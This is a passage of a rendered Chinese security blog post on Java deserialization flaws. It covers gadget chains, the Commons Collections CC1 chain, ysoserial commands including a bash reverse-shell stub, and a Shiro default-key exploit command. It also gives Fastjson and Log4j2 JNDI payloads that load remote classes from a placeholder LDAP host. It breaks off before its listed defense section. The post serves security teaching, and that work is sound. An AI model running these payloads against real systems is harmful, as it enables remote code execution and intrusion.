@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言Java 反序列化漏洞从 Apache Commons Collections 系列爆出后，几乎每年都有大瓜。Fastjson、Shiro、Log4j2 都被它折磨过。本文梳理原理、利用面与防御。仅用于合法授权环境。 0x01 原理1. Java 序列化把对象转成字节流： 12ObjectOutputStream oos &#x3D; new ObjectOutputStream(new Fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 反序列化漏洞初探">
+<meta property="og:url" content="https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="0x00 前言Java 反序列化漏洞从 Apache Commons Collections 系列爆出后，几乎每年都有大瓜。Fastjson、Shiro、Log4j2 都被它折磨过。本文梳理原理、利用面与防御。仅用于合法授权环境。 0x01 原理1. Java 序列化把对象转成字节流： 12ObjectOutputStream oos &#x3D; new ObjectOutputStream(new Fi">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-20T05:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-01T10:10:20.748Z">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="漏洞原理">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/","path":"2026/09/20/Java反序列化漏洞初探/","title":"Java 反序列化漏洞初探"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java 反序列化漏洞初探 | 网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">网安学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Java-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">1. Java 序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.</span> <span class="nav-text">2. 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83%EF%BC%9AGadget-Chain"><span class="nav-number">2.3.</span> <span class="nav-text">3. 漏洞核心：Gadget Chain</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%8F%E5%85%B8-CommonsCollections-%E9%93%BE"><span class="nav-number">3.</span> <span class="nav-text">0x02 经典 CommonsCollections 链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CC1%EF%BC%88Lazymap%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">CC1（Lazymap）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC6%EF%BC%88%E7%BB%95%E8%BF%87-CC1-%E4%BF%AE%E5%A4%8D%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">CC6（绕过 CC1 修复）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CC2-CC4"><span class="nav-number">3.3.</span> <span class="nav-text">CC2 &#x2F; CC4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 实战利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ysoserial-%E4%B8%80%E9%94%AE%E7%94%9F%E6%88%90"><span class="nav-number">4.1.</span> <span class="nav-text">1. ysoserial 一键生成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8A%95%E9%80%92%E6%96%B9%E5%BC%8F"><span class="nav-number">4.2.</span> <span class="nav-text">2. 投递方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="nav-number">4.3.</span> <span class="nav-text">3. 检测反序列化点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">0x04 其他常见组件链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Shiro"><span class="nav-number">5.1.</span> <span class="nav-text">1. Shiro</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Fastjson"><span class="nav-number">5.2.</span> <span class="nav-text">2. Fastjson</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Log4j2%EF%BC%88CVE-2021-44228%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">3. Log4j2（CVE-2021-44228）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Spring-Cloud-Function-Spring4Shell"><span class="nav-number">5.4.</span> <span class="nav-text">4. Spring Cloud Function &#x2F; Spring4Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-JNDI-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">0x05 JNDI 注入利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E9%98%B2%E5%BE%A1"><span class="nav-number">7.</span> <span class="nav-text">0x06 防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8D%87%E7%BA%A7%E7%BB%84%E4%BB%B6"><span class="nav-number">7.1.</span> <span class="nav-text">1. 升级组件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">7.2.</span> <span class="nav-text">2. 白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%B3%E9%97%AD%E5%8D%B1%E9%99%A9%E7%89%B9%E6%80%A7"><span class="nav-number">7.3.</span> <span class="nav-text">3. 关闭危险特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%9B%91%E6%8E%A7"><span class="nav-number">7.4.</span> <span class="nav-text">4. 监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%B7%A5%E5%85%B7"><span class="nav-number">8.</span> <span class="nav-text">0x07 工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">0x08 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java 反序列化漏洞初探 | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java 反序列化漏洞初探
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-09-20 13:00:00" itemprop="dateCreated datePublished" datetime="2026-09-20T13:00:00+08:00">2026-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:10:20" itemprop="dateModified" datetime="2026-09-01T18:10:20+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>971</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Java 反序列化漏洞从 Apache Commons Collections 系列爆出后，几乎每年都有大瓜。Fastjson、Shiro、Log4j2 都被它折磨过。本文梳理原理、利用面与防御。仅用于合法授权环境。</p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><h3 id="1-Java-序列化"><a href="#1-Java-序列化" class="headerlink" title="1. Java 序列化"></a>1. Java 序列化</h3><p>把对象转成字节流：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line">oos.writeObject(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>字节流含：</p>
+<ul>
+<li>类的全限定名</li>
+<li>字段名 + 类型 + 值</li>
+<li>类的 serialVersionUID</li>
+<li>父类信息</li>
+</ul>
+<h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2. 反序列化"></a>2. 反序列化</h3><p>把字节流还原成对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>漏洞关键：<strong>反序列化时会调用对象的 <code>readObject</code> &#x2F; <code>readResolve</code> &#x2F; <code>readExternal</code> 等方法</strong>。如果这些方法里有危险操作，构造特殊字节流即可触发。</p>
+<h3 id="3-漏洞核心：Gadget-Chain"><a href="#3-漏洞核心：Gadget-Chain" class="headerlink" title="3. 漏洞核心：Gadget Chain"></a>3. 漏洞核心：Gadget Chain</h3><p>反序列化利用链由多个类协作形成，每个类被叫做一个 Gadget。经典模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">入口类（HashSet、HashMap、PriorityQueue）</span><br><span class="line">   ↘ 触发反序列化时调用某个方法</span><br><span class="line">中间类（AnnotationInvocationHandler）</span><br><span class="line">   ↖ 调用 transform()</span><br><span class="line">危险类（InvokerTransformer / TemplatesImpl）</span><br><span class="line">   → 执行命令 / 加载字节码</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-经典-CommonsCollections-链"><a href="#0x02-经典-CommonsCollections-链" class="headerlink" title="0x02 经典 CommonsCollections 链"></a>0x02 经典 CommonsCollections 链</h2><h3 id="CC1（Lazymap）"><a href="#CC1（Lazymap）" class="headerlink" title="CC1（Lazymap）"></a>CC1（Lazymap）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span>[] <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line">lazyMap.get(<span class="string">&quot;anything&quot;</span>);  <span class="comment">// 触发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CC6（绕过-CC1-修复）"><a href="#CC6（绕过-CC1-修复）" class="headerlink" title="CC6（绕过 CC1 修复）"></a>CC6（绕过 CC1 修复）</h3><p>不同链路，但效果一致。CC6 是当前利用率最高的链。</p>
+<h3 id="CC2-CC4"><a href="#CC2-CC4" class="headerlink" title="CC2 &#x2F; CC4"></a>CC2 &#x2F; CC4</h3><p>基于 <code>PriorityQueue</code> + <code>TransformingComparator</code>，需要 <code>commons-collections4</code>。</p>
+<h2 id="0x03-实战利用"><a href="#0x03-实战利用" class="headerlink" title="0x03 实战利用"></a>0x03 实战利用</h2><h3 id="1-ysoserial-一键生成"><a href="#1-ysoserial-一键生成" class="headerlink" title="1. ysoserial 一键生成"></a>1. ysoserial 一键生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc.exe&quot;</span> &gt; payload.bin</span><br><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; payload.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-投递方式"><a href="#2-投递方式" class="headerlink" title="2. 投递方式"></a>2. 投递方式</h3><p>把 payload 字节流塞进任何反序列化点：</p>
+<ul>
+<li><strong>HTTP Cookie</strong>：很多框架把 session 序列化</li>
+<li><strong>RMI&#x2F;JMX</strong>：直接发到 1099 端口</li>
+<li><strong>JNDI 注入</strong>：LDAP &#x2F; RMI 服务</li>
+<li><strong>HTTP 报文体</strong>：POST body</li>
+<li><strong>自定义协议</strong>：比如 Java WebService 的 SOAP</li>
+</ul>
+<h3 id="3-检测反序列化点"><a href="#3-检测反序列化点" class="headerlink" title="3. 检测反序列化点"></a>3. 检测反序列化点</h3><p>字节流以 <code>AC ED 00 05</code>（java serialization stream magic）开头，base64 后以 <code>rO0AB</code> 开头。BurpSuite 加正则匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\xac\xed\x00\x05</span><br><span class="line">rO0AB[A-Za-z0-9+/]+</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-其他常见组件链"><a href="#0x04-其他常见组件链" class="headerlink" title="0x04 其他常见组件链"></a>0x04 其他常见组件链</h2><h3 id="1-Shiro"><a href="#1-Shiro" class="headerlink" title="1. Shiro"></a>1. Shiro</h3><p>记住 Shiro 默认密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 ysoserial 生成 payload</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span> &gt; payload.<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AES 加密 + base64 + Cookie 头</span></span><br><span class="line">python shiro_exploit.py --target http://target.com \</span><br><span class="line">  --key kPH+bIxk5D2deZiIxcaaaA== \</span><br><span class="line">  --payload-file payload.<span class="built_in">bin</span> \</span><br><span class="line">  --header Cookie:rememberMe=...</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Fastjson"><a href="#2-Fastjson" class="headerlink" title="2. Fastjson"></a>2. Fastjson</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://1.2.3.4/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.2.24 修复后陆续有 <code>1.2.47</code>、<code>1.2.68</code> 的绕过，每个版本都修一遍。</p>
+<h3 id="3-Log4j2（CVE-2021-44228）"><a href="#3-Log4j2（CVE-2021-44228）" class="headerlink" title="3. Log4j2（CVE-2021-44228）"></a>3. Log4j2（CVE-2021-44228）</h3><p>不是序列化，但 JNDI 注入路径相同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://1.2.3.4/Exploit&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端打 LDAP &#x2F; RMI 加载恶意类。</p>
+<h3 id="4-Spring-Cloud-Function-Spring4Shell"><a href="#4-Spring-Cloud-Function-Spring4Shell" class="headerlink" title="4. Spring Cloud Function &#x2F; Spring4Shell"></a>4. Spring Cloud Function &#x2F; Spring4Shell</h3><p>特定路由上的 SpEL &#x2F; OGNL 注入引发 RCE。</p>
+<h2 id="0x05-JNDI-注入利用"><a href="#0x05-JNDI-注入利用" class="headerlink" title="0x05 JNDI 注入利用"></a>0x05 JNDI 注入利用</h2><p>JNDI 是反序列化漏洞最常见的”出口”。</p>
